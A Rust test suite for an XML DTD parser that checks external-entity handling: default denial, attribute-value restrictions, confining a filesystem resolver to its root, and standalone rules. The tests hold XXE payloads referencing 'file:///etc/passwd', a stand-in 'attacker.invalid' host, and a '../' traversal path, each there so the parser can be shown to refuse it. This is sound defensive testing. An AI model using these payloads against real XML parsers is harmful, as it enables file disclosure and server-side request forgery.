//! External entities: the opt-in resolver, the SSRF-safe default, and the
//! standalone-document constraints that depend on where a declaration came
//! from.

use std::fs;
use std::path::PathBuf;

use oxixml_dtd::{
    DocumentValidator, DtdErrorKind, DtdParser, EntityResolver, Error, ExternalKind,
    FilesystemResolver, MemoryResolver, ResolveRequest, ResolvedEntity, ResolverError,
    ValidityErrorKind,
};

/// A resolver that records what it was asked for and always refuses, so that a
/// test can prove *whether* resolution was attempted at all.
#[derive(Debug, Default)]
struct RecordingResolver {
    requests: Vec<String>,
}

impl EntityResolver for RecordingResolver {
    fn resolve(&mut self, request: &ResolveRequest<'_>) -> Result<ResolvedEntity, ResolverError> {
        self.requests
            .push(format!("{:?}:{}", request.kind, request.system_id));
        Err(ResolverError::Denied)
    }
}

#[test]
fn nothing_external_is_fetched_by_default() {
    let error = DtdParser::new()
        .parse_doctype(r#"a SYSTEM "http://attacker.invalid/steal.dtd""#)
        .expect_err("the default resolver denies everything");
    assert!(
        matches!(error.kind(), DtdErrorKind::ExternalEntityDenied { .. }),
        "{error}"
    );

    let error = DtdParser::new()
        .parse_internal_subset(r#"<!ENTITY % p SYSTEM "file:///etc/passwd">%p;"#)
        .expect_err("the default resolver denies everything");
    assert!(
        matches!(error.kind(), DtdErrorKind::ExternalEntityDenied { .. }),
        "{error}"
    );
}

#[test]
fn an_external_general_entity_is_not_fetched_in_content_by_default() {
    let xml = r#"<!DOCTYPE a [
        <!ELEMENT a (#PCDATA)>
        <!ENTITY secret SYSTEM "file:///etc/passwd">
    ]><a>&secret;</a>"#;
    let error = DocumentValidator::new()
        .validate_str(xml)
        .expect_err("denied");
    let Error::Dtd(error) = error else {
        panic!("expected a DTD error, got {error:?}");
    };
    assert!(
        matches!(error.kind(), DtdErrorKind::ExternalEntityDenied { .. }),
        "{error}"
    );
}

#[test]
fn an_external_entity_in_an_attribute_value_is_always_refused() {
    // WFC: No External Entity References (XML 1.0 §3.1) — even with a resolver
    // that would happily supply it.
    let resolver = MemoryResolver::new().with("x.ent", "text");
    let xml = r#"<!DOCTYPE a [
        <!ELEMENT a EMPTY>
        <!ATTLIST a v CDATA #IMPLIED>
        <!ENTITY e SYSTEM "x.ent">
    ]><a v="&e;"/>"#;
    let error = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(xml)
        .expect_err("external entities may not appear in attribute values");
    let Error::Dtd(error) = error else {
        panic!("expected a DTD error, got {error:?}");
    };
    assert!(
        matches!(error.kind(), DtdErrorKind::ExternalEntityDenied { .. }),
        "{error}"
    );
}

#[test]
fn the_resolver_sees_every_kind_of_request() {
    let mut resolver = RecordingResolver::default();
    let request = ResolveRequest {
        kind: ExternalKind::Subset,
        name: None,
        public_id: Some("-//X//DTD//EN"),
        system_id: "x.dtd",
        base: None,
    };
    assert_eq!(resolver.resolve(&request), Err(ResolverError::Denied));
    assert_eq!(resolver.requests, ["Subset:x.dtd"]);
}

#[test]
fn an_installed_resolver_supplies_the_external_subset() -> Result<(), Error> {
    let resolver = MemoryResolver::new().with(
        "shared.dtd",
        r#"<!ELEMENT a (b+)><!ELEMENT b EMPTY><!ATTLIST b n CDATA "1">"#,
    );
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(r#"<!DOCTYPE a SYSTEM "shared.dtd"><a><b/></a>"#)?;
    assert!(report.is_valid(), "{:?}", report.errors());
    assert!(report.dtd().external_subset_read());
    assert!(report.dtd().has_external_subset());
    Ok(())
}

#[test]
fn external_parameter_entities_are_expanded_into_the_dtd() -> Result<(), Error> {
    let resolver = MemoryResolver::new()
        .with("common.ent", r#"<!ELEMENT shared EMPTY>"#)
        .with(
            "main.dtd",
            r#"<!ENTITY % common SYSTEM "common.ent">
               %common;
               <!ELEMENT root (shared)>"#,
        );
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(r#"<!DOCTYPE root SYSTEM "main.dtd"><root><shared/></root>"#)?;
    assert!(report.is_valid(), "{:?}", report.errors());
    assert!(report.dtd().saw_parameter_entity_reference());
    Ok(())
}

#[test]
fn external_general_entities_are_parsed_as_content() -> Result<(), Error> {
    let resolver = MemoryResolver::new().with("part.ent", "<b/><b/>");
    let xml = r#"<!DOCTYPE a [
        <!ELEMENT a (b, b)>
        <!ELEMENT b EMPTY>
        <!ENTITY part SYSTEM "part.ent">
    ]><a>&part;</a>"#;
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(xml)?;
    assert!(report.is_valid(), "{:?}", report.errors());
    Ok(())
}

#[test]
fn a_text_declaration_at_the_head_of_an_external_entity_is_not_a_processing_instruction()
-> Result<(), Error> {
    let resolver = MemoryResolver::new().with(
        "d.dtd",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ELEMENT a EMPTY>",
    );
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(r#"<!DOCTYPE a SYSTEM "d.dtd"><a/>"#)?;
    assert!(report.is_valid(), "{:?}", report.errors());
    Ok(())
}

#[test]
fn conditional_sections_are_allowed_only_outside_the_internal_subset() -> Result<(), Error> {
    let resolver = MemoryResolver::new().with(
        "cond.dtd",
        r#"<!ENTITY % use "INCLUDE">
           <![ %use; [ <!ELEMENT a EMPTY> ]]>
           <![ IGNORE [ <!ELEMENT a (b) ]]>"#,
    );
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(r#"<!DOCTYPE a SYSTEM "cond.dtd"><a/>"#)?;
    assert!(report.is_valid(), "{:?}", report.errors());

    let error = DtdParser::new()
        .parse_doctype("a [ <![INCLUDE[ <!ELEMENT a EMPTY> ]]> ]")
        .expect_err("not allowed in the internal subset");
    assert!(matches!(
        error.kind(),
        DtdErrorKind::ConditionalSectionInInternalSubset
    ));
    Ok(())
}

#[test]
fn the_filesystem_resolver_stays_inside_its_root() -> Result<(), Box<dyn std::error::Error>> {
    let root: PathBuf = std::env::temp_dir().join(format!(
        "oxixml-dtd-resolver-{}-{}",
        std::process::id(),
        line!()
    ));
    let nested = root.join("sub");
    fs::create_dir_all(&nested)?;
    fs::write(
        nested.join("main.dtd"),
        "<!ENTITY % more SYSTEM \"more.ent\">%more;",
    )?;
    fs::write(nested.join("more.ent"), "<!ELEMENT a EMPTY>")?;
    fs::write(root.join("secret.txt"), "TOP SECRET")?;

    // A relative reference inside the root resolves, including one that is
    // relative to the entity that named it.
    let dtd = DtdParser::new()
        .with_resolver(Box::new(FilesystemResolver::new(&root)))
        .parse_doctype(r#"a SYSTEM "sub/main.dtd""#)?;
    assert!(dtd.element("a").is_some());

    // …but climbing out of the root does not.
    let error = DtdParser::new()
        .with_resolver(Box::new(FilesystemResolver::new(&nested)))
        .parse_doctype(r#"a SYSTEM "../secret.txt""#)
        .expect_err("the resolver must refuse to escape its root");
    assert!(
        matches!(error.kind(), DtdErrorKind::ExternalEntityUnavailable { .. }),
        "{error}"
    );

    // …and neither does any other scheme.
    let error = DtdParser::new()
        .with_resolver(Box::new(FilesystemResolver::new(&root)))
        .parse_doctype(r#"a SYSTEM "http://attacker.invalid/x.dtd""#)
        .expect_err("the resolver only serves files");
    assert!(
        matches!(error.kind(), DtdErrorKind::ExternalEntityUnavailable { .. }),
        "{error}"
    );

    fs::remove_dir_all(&root)?;
    Ok(())
}

#[test]
fn standalone_yes_forbids_relying_on_external_markup() -> Result<(), Error> {
    let resolver = MemoryResolver::new().with(
        "ext.dtd",
        r#"<!ELEMENT a (b)><!ELEMENT b EMPTY><!ATTLIST b d CDATA "from-outside">"#,
    );
    let xml = r#"<?xml version="1.0" standalone="yes"?>
        <!DOCTYPE a SYSTEM "ext.dtd">
        <a><b/></a>"#;
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(xml)?;
    assert_eq!(report.standalone(), Some(true));
    assert!(
        report
            .errors()
            .iter()
            .any(|error| matches!(error.kind(), ValidityErrorKind::StandaloneViolation { .. }))
    );
    Ok(())
}

#[test]
fn standalone_no_permits_the_very_same_document() -> Result<(), Error> {
    let resolver = MemoryResolver::new().with(
        "ext.dtd",
        r#"<!ELEMENT a (b)><!ELEMENT b EMPTY><!ATTLIST b d CDATA "from-outside">"#,
    );
    let xml = r#"<?xml version="1.0" standalone="no"?>
        <!DOCTYPE a SYSTEM "ext.dtd">
        <a><b/></a>"#;
    let report = DocumentValidator::new()
        .with_resolver(Box::new(resolver))
        .validate_str(xml)?;
    assert_eq!(report.standalone(), Some(false));
    assert!(report.is_valid(), "{:?}", report.errors());
    Ok(())
}

#[test]
fn declarations_remember_whether_they_came_from_outside() -> Result<(), Error> {
    let resolver = MemoryResolver::new().with("ext.dtd", "<!ELEMENT outside EMPTY>");
    let dtd = DtdParser::new()
        .with_resolver(Box::new(resolver))
        .parse_doctype(r#"root SYSTEM "ext.dtd" [ <!ELEMENT inside EMPTY> ]"#)?;
    assert_eq!(
        dtd.element("inside")
            .map(oxixml_dtd::ElementDecl::is_external),
        Some(false)
    );
    assert_eq!(
        dtd.element("outside")
            .map(oxixml_dtd::ElementDecl::is_external),
        Some(true)
    );
    Ok(())
}

#[test]
fn notation_declarations_accept_a_bare_public_identifier() -> Result<(), Error> {
    let dtd = DtdParser::new().parse_internal_subset(
        r#"<!NOTATION only-public PUBLIC "-//X//NOTATION Y//EN">
           <!NOTATION both PUBLIC "-//X//NOTATION Z//EN" "z.spec">
           <!NOTATION system-only SYSTEM "s.spec">"#,
    )?;
    assert_eq!(
        dtd.notation("only-public")
            .and_then(oxixml_dtd::NotationDecl::system_id),
        None
    );
    assert_eq!(
        dtd.notation("both")
            .and_then(oxixml_dtd::NotationDecl::system_id),
        Some("z.spec")
    );
    assert_eq!(
        dtd.notation("system-only")
            .and_then(oxixml_dtd::NotationDecl::public_id),
        None
    );
    Ok(())
}

#[test]
fn unparsed_entities_may_not_be_referenced_as_content() {
    let xml = r#"<!DOCTYPE a [
        <!NOTATION gif SYSTEM "image/gif">
        <!ENTITY logo SYSTEM "logo.gif" NDATA gif>
        <!ELEMENT a (#PCDATA)>
    ]><a>&logo;</a>"#;
    let error = DocumentValidator::new()
        .validate_str(xml)
        .expect_err("WFC: Parsed Entity");
    let Error::Dtd(error) = error else {
        panic!("expected a DTD error, got {error:?}");
    };
    assert!(
        matches!(error.kind(), DtdErrorKind::UnparsedEntityReference(_)),
        "{error}"
    );
}

#[test]
fn an_unparsed_entity_must_name_a_declared_notation() -> Result<(), Error> {
    let dtd = DtdParser::new()
        .parse_internal_subset(r#"<!ENTITY logo SYSTEM "logo.gif" NDATA missing-notation>"#)?;
    assert!(dtd.declaration_errors().iter().any(|error| matches!(
        error.kind(),
        ValidityErrorKind::EntityNotationNotDeclared { .. }
    )));
    Ok(())
}
